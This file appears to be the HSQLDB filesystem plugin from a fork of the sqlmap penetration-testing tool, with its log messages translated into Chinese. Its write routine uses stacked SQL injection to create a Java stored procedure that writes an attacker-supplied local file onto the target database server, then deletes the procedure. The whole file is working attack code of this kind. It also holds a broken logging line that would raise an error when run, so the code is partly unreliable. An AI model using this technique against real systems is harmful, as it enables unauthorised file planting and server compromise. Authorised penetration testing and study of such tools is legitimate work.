#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import PLACE
from lib.request import inject
from lib.core.exception import SqlmapUnsupportedFeatureException
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def readFile(self, remoteFile):
        errMsg = "在 HSQLDB 上无法读取文件"
        raise SqlmapUnsupportedFeatureException(errMsg)

    @stackedmethod
    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        funcName = randomStr()
        max_bytes = 1024 * 1024

        debugMsg = "创建 JLP 过程 '%s'" % funcName
        logger.debug(debugMsg)

        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (funcName, max_bytes)
        addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
        addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
        inject.goStacked(addFuncQuery)

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由于注入在 GET 参数中，文件要写入十六进制值 %d 字节，" % fcEncodedStrLen
            warnMsg += "这可能会导致文件写入过程出错"
            logger.warning(warnMsg)

        debugMsg = "将 %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Reference: http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
        invokeQuery = "CALL %s('%s', CAST('%s' AS VARBINARY(%s)))" % (funcName, remoteFile, fcEncodedStr, max_bytes)
        inject.goStacked(invokeQuery)

        logger.debug("cleaning up" % funcName)
        delQuery = "DELETE PROCEDURE %s" % funcName
        inject.goStacked(delQuery)

        message = "本地文件 '%s' 已被写入后端 DBMS 文件系统 ('%s')" % (localFile, remoteFile)
        logger.info(message)
